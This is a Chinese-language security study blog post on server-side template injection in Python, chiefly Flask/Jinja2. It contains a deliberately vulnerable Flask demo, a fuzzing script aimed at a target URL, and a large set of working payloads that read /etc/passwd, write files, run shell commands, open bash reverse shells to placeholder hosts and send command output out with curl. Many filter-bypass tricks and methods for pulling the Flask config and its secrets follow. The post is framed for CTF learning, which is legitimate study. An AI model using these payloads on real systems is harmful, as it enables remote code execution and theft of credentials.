# Python安全学习—SSTI模板注入

Author: H3rmesk1t

Data: 2021.09.09

# SSTI简介
- MVC是一种框架型模式，全名是Model View Controller
- 即模型(model)－视图(view)－控制器(controller)，在MVC的指导下开发中用一种业务逻辑、数据、界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，得到更好的开发和维护效率
- 在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给 View ，这样就最终显示在我们的面前了，那么这里的 View 中就会大量地用到一种叫做模板的技术
- 绕过服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题
- 虽然市面上关于SSTI的题大都出在python上，但是这种攻击方式请不要认为只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言

# 常见的模板引擎
## PHP
- Smarty：Smarty 算是一种很老的 PHP 模板引擎，使用的比较广泛

- Twig：Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用，它的操作有点像 Mustache 和 liquid

- Blade：Blade 是 Laravel 提供的一个既简单又强大的模板引擎，和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码，所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给应用增加任何额外负担

## JAVA
- JSP：这个是一个非常的经典 Java 的模板引擎

- FreeMarker：是一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具， 它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件

- Velocity：Velocity 作为历史悠久的模板引擎不单单可以替代 JSP 作为 Java Web 的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力

## PYTHON
- Jinja2：flask jinja2 一直是一起说的，使用非常的广泛

- django：django 应该使用的是专属于自己的一个模板引擎，django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的

- tornado：tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发

## RUBY
ERB：全称是Embedded RuBy，意思是嵌入式的Ruby，是一种文本模板技术，和 JSP 的语法很像

## GOLANG
- 关于 Golang Template 的 SSTI 研究目前来说还比较少，可能是因为本身设计的也比较安全，现在一般是点和作用域的问题


# SSTI产生的原因
- 服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题

# 常用检测工具 Tplmap
- 工具地址：[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

<img src="https://pic.imgdb.cn/item/6139ba0044eaada739bb78bb.png" alt="">

<img src="https://pic.imgdb.cn/item/6139ba1344eaada739bb9b53.png" alt="">

# Flask/Jinja模板引擎的相关绕过
- 由于 Flask/Jinja 模板引擎的出现漏洞的几率较大，网上对于这方面的分析的文章也很多，这里对其做个总结

## Flask简介
- Flask 是一个用 Python 编写的 Web 应用程序框架，其优点是提供给用户的扩展能力很强，框架只完成了简单的功能，有很大一部分功能可以让用户自己选择并实现

## demo漏洞代码

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string
app = Flask(__name__)
@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div
    ''' %(request.url)
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='127.0.0.1', debug=True)
```

## 基础知识
### 沙盒逃逸
- 沙箱逃逸就是在一个代码执行环境下 (Oj 或使用 socat 生成的交互式终端)，脱离种种过滤和限制，最终成功拿到 shell 权限的过程

### Python的内建函数
- 启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数
- 在 Python 交互模式下，使用命令 `dir('builtins')` 即可查看当前 Python 版本的一些内建变量、内建函数，内建函数可以调用一切函数

<img src="https://pic.imgdb.cn/item/6139bd9644eaada739c1e1a5.png" alt="">

### 名称空间
- 要了解内建函数是如何工作的，首先需要需要了解一下名称空间，Python 的名称空间是从名称到对象的映射，在 Python 程序的执行过程中至少会存在两个名称空间

1. 内建名称空间：Python 自带的名字，在 Python 解释器启动时产生，存放一些 Python 内置的名字
2. 全局名称空间：在执行文件时，存放文件级别定义的名字
3. 局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效

- 加载顺序：内置名称空间 —全局名称空间 —局部名称空间
- 名字的查找顺序：局部名称空间 —全局名称空间 —内置名称空间

### 类继承
- 构造 Python-SSTI 的 Payload 需要什么是类继承
- Python 中一切均为对象，均继承于 object 对象，Python 的 object 类中集成了很多的基础函数，假如需要在 Payload 中使用某个函数就需要用 object 去操作

- 常见的继承关系的方法有以下三种:
1. __base__：对象的一个基类，一般情况下是 object
2. __mro__：获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object 在最底层所以在列表中的最后，通过 __mro__[-1] 可以获取到
3. __subclasses__()：继承此对象的子类，返回一个列表

- 攻击方式为：变量 -对象 -基类 -子类遍历 -全局变量

## 寻找Python-SSTI攻击载荷的过程
### 攻击载荷过程
- 获取基本类
```python
对于返回的是定义的Class类的话:
__dict__          //返回类中的函数和属性，父类子类互不影响
__base__          //返回类的父类 python3
__mro__           //返回类继承的元组，(寻找父类) python3
__init__          //返回类的初始化方法   
__subclasses__()  //返回类中仍然可用的引用  python3
__globals__       //对包含函数全局变量的字典的引用 python3

对于返回的是类实例的话:
__class__         //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法
```
```python
''.__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
```

- 此外，在引入了 Flask/Jinja 的相关模块后还可以通过以下字符来获取基本类
```python
config
request
url_for
get_flashed_messages
self
redirect
```

- 获取基本类后，继续向下获取基本类 (object) 的子类

```python
object.__subclasses__()
```

- 找到重载过的 `__init__` 类，在获取初始化属性后，带 `wrapper` 的说明没有重载，寻找不带 `warpper` 的；也可以利用 `.index()`去找 `file`, `warnings.catch_warnings`

```python
''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>

''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

- 查看其引用 `__builtins__`

```python
''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']
```

- 这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能

```python
''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

### 常用的目标函数
```python
file
subprocess.Popen
os.popen
exec
eval
```

### 常见的中间对象
```python
catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1')
lipsum.__globals__.__builtins__.open("/flag").read()
linecache.os.system('ls')
```

### fuzz可利用类脚本
- 例如对 subprocess.Popen 可以构造如下 fuzz 脚本

```python
import requests

url = ""

index = 0
for i in range(100, 1000):
    #print i
    payload = "{{''.__class__.__mro__[-1].__subclasses__()[%d]}}" % (i)
    params = {
        "search": payload
    }
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}" % i)
```

### 服务端fuzz
- 利用 `{%for%}`语句块来在服务端进行 fuzz

```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
  {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}
  {% endif %}
{% endfor %}
```

### Python常用的命令执行方式
1. os.system()：该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 的返回值；注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1）

2. os.popen()：返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法

## Python-Web框架配置文件
### Tornado
- `handler.settings`：handler.settings-RequestHandler.application.settings，可以获取当前 application.settings，从中获取到敏感信息

### flaks
- 内置函数：config 是 Flask 模版中的一个全局对象，代表"当前配置对象(flask.config)"，是一个类字典的对象，包含了所有应用程序的配置值，在大多数情况下包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值
- url_for()：用于反向解析生成 url
- get_flashed_messages()：用于获取 flash 消息
```python
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}

如果过滤了{{config}}且框架是flask的话便可以使用如下payload进行代替

{{get_flashed_messages.__globals__['current_app'].config}}
{{url_for.__globals__['current_app'].config}}
```

## Flask过滤器
### 定义
- flask 过滤器和其它语言的过滤器作用几乎一致，对数据进行过滤，可以参考 php 伪协议中的 php://filter 协议，支持链式过滤

### 使用方式
```python
变量|过滤器
variable|filter(args)    
variable|filter        //如果过滤器没有参数可以不加括号
```

### 用的过滤器
```python
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号，显例：content|escape或content|e；

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义，示例： {{'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串，比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替，示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代，boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true，也可以使用or来替换
```

## 模块查找脚本
- Python2

```python
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print num,item
        num+=1
    except:
        num+=1
```

- Python3

```python
#!/usr/bin/python3
# coding=utf-8
# python 3.5
#jinja2模板
from flask import Flask
from jinja2 import Template
# Some of special names
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
```

## 常见Payload
- Python2

```python
#python2有file
#读取密码
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
#写文件
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
#OS模块
system
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
popen
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
#eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
#__import__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
#反弹shell
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/你的服务器地址/端口 0>&1').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/xxxx/9999 0>&1"')
注意该Payload不能直接放在 URL 中执行 , 因为 & 的存在会导致 URL 解析出现错误，可以使用burp等工具
#request.environ
与服务器环境相关的对象字典
```

- Python3

```python
#python3没有file，用的是open
#文件读取
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
{{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
```
- 可以参考：[https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)

## 常见可利用类
- 文件读取_方法一_子模块利用
- 存在的子模块可以通过 `.index()` 来进行查询，如果存在的话返回索引

```python
''.__class__.__mro__[2].__subclasses__().index(file)
```

- `flie` 类：(在字符串的所属对象种获取 `str` 的父类，在其 `object` 父类种查找其所有子类，第 41 个为 `file` 类)

```python
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```

- `_frozen_importlib_external.FileLoader` 类：(前置查询一样，其是第 91 个类)

```python
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<file_To_Read>")
```

- 文件读取_方法二_通过函数解析->基本类->基本类子类->重载类->引用->查找可用函数

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #将read() 修改为 write() 即为写文件
```

- 命令执行_方法一_利用 `eval` 进行命令执行

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

- 命令执行_方法二_利用 `warnings.catch_warnings` 进行命令执行

```python
查看 warnings.catch_warnings 方法的位置
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)

查看 linecatch 的位置
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')

查找os模块的位置
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')

查找system方法的位置(在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述)
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')

调用system方法
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
```

- 命令执行_方法三_利用 `commands` 进行命令执行

```python
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

## 遇到SSTI题目时的思路
- 考虑查看配置文件或者考虑命令执行

## 花式绕过
### 绕过中括号
- `pop()` 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值，或者用 `getitem`

```python
__mro__[2]== __mro__.__getitem__(2)
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```

### 绕过引号
- `request.args、request.values、request.cookies` 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤

```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

### 绕过双下划线
- 同样利用 `request.args、request.values、request.cookies`

```python
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

### 拼接绕过
```python
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
```

### 编码绕过
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(
等价于
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")
```

### 绕过{{或}}
- 使用 `{%` 进行绕过
```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
```

### 绕过.
- 可以使用 `attr()` 或 `[]` 绕过

```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}

{{ config['__class__']['__init__']['__globals__']['os']['popen']('dir')['read']() }}
```

### 过滤圆括号
- 对函数执行方式进行重载，比如将 `request.__class__.__getitem__=__builtins__.exec;`，那么执行 `request[payload]` 时就相当于 `exec(payload)` 了，使用 lambda 表达式进行绕过

### 绕过_和引号
- 可以用 `|attr` 绕过
```python
{{()|attr(request.values.a)}}&a=class
```
- 使用 `request` 对象绕过，假设过滤了 `__class__` 可以使用下面的形式进行替代
```python
{{''[request.args.t1]}}&t1=__class__
#若request.args改为request.values则利用post的方式进行传参

{{''[request['args']['t1']]}}&t1=__class__
#若使用POST，args换成form即可
```

### 关键词过滤
- base64编码绕过

```python
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

- 字符串拼接绕过

```python
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

- 利用dict拼接

```python
{% set a=dict(o=x,s=xx)|join %}
```

- 利用string
- 比如 `'` 可以用下面方式拿到并存放在 `quote` 中
```python
{% set quote = ((app.__doc__|list()).pop(337)|string())%}
类似的还有
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}
```

- 通过 `~` 可以将得到的字符连接起来
- 例如一个 eval 的 Payload

```python
{% set xhx = (({ }|select()|string|list()).pop(24)|string)%}
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set quote = ((app.__doc__|list()).pop(337)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set bu = dict(buil=x,tins=xx)|join %}
{% set im = dict(imp=x,ort=xx)|join %}
{% set sy = dict(po=x,pen=xx)|join %}
{% set oms = dict(o=x,s=xx)|join %}
{% set fl4g = dict(f=x,lag=xx)|join %}
{% set ca = dict(ca=x,t=xx)|join %}
{% set ev = dict(ev=x,al=xx)|join %}
{% set red = dict(re=x,ad=xx)|join%}
{% set bul = xhx*2~bu~xhx*2 %}
{% set payload = xhx*2~im~xhx*2~lb~quote~oms~quote~rb~pt~sy~lb~quote~ca~sp~slas~fl4g~quote~rb~pt~red~lb~rb %}
```

- Python3 对 Unicode 的 Normal 化，导致 exec 可以执行 unicode 代码

<img src="https://pic.imgdb.cn/item/6139ce6f44eaada739f4aef2.png" alt="">

- Python 的格式化字符串特性

```python
{{""['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]}}
```

- getlist，使用 `.getlist()` 方法获得一个列表，这个列表的参数可以在后面传递

```python
{%print (request.args.getlist(request.args.l)|join)%}&l=a&a=_&a=_&a=class&a=_&a=_
```

### 对象层面禁用
- set {}=None，只能设置该对象为 None，通过其他引用同样可以找到该对象

```python
{{% set config=None%}} -{{url_for.__globals__.current_app.config}}
```

- del

```python
del __builtins__.__dict__['__import__']
```

- 通过reload进行重载，从而恢复内建函数

```python
reload(__builtins__)
```

### 过滤config、request以及class
- 在官方文档中有一个 session 对象，session 是一个 dict 对象，因此可以通过键的方法访问相应的类，由于键是一个字符串，因此可以通过字符串拼接绕过，payload：`{{ session['__cla'+'ss__'] }}` 即可绕过过滤访问到类，进而访问基类、执行命令等

### 过滤config、request、class、__init__、file、__dict__、__builtines__、__import__、getattr以及os
- Python3中有一个 `__enter__` 方法，也有 `__globals__` 方法可用，而且与 `__init__` 一模一样

```python
__init__ (allocation of the class)
__enter__ (enter context)
__exit__ (leaving context)

{{ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /etc/passwd').read() }}
```

## trick
### Python字符的几种表示方式
```python
16进制 \x41

8进制 \101

unicode \u0074

base64 'X19jbGFzc19f'.decode('base64') python3

join "fla".join("/g")

slice "glaf"[::-1]

lower/upper ["__CLASS__"|lower

format "%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)

replace "__claee__"|replace("ee","ss")

reverse "__ssalc__"|reverse
```

### Python字典或列表获取键值或下标的几种方式
```python
dict['__builtins__']

dict.__getitem__('__builtins__')

dict.pop('__builtins__')

dict.get('__builtins__')

dict.setdefault('__builtins__')

list[0]

list.__getitem__(0)

list.pop(0)
```

### SSTI获取对象元素的几种方式
```python
class.attr

class.__getattribute__('attr')

class['attr']

class|attr('attr')

"".__class__.__mro__.__getitem__(2)

['__builtins__'].__getitem__('eval')

class.pop(40)
```

### request旁路注入
```python
request.args.name    #GET name

request.cookies.name #COOKIE name

request.headers.name #HEADER name

request.values.name  #POST or GET Name

request.form.name    #POST NAME

request.json         #Content-Type json
```

### 通过拿到current_app这个对象获取当前flask App的上下文信息来实现config读取
```python
{{url_for.__globals__.current_app.config}}

{{url_for.__globals__['current_app'].config}}

{{get_flashed_messages.__globals__['current_app'].config.}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].cofig}}
```

### 特殊变量
- url_for, g,request,namespace,lipsum,range,session,dict,get_flashed_messages,cycler,joiner,config等，当config、self被过滤了，但仍需要获取配置信息时，就需要从它的上部全局变量(访问配置current_app等)

```python
{{url_for.__globals__['current_app'].config.FLAG}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}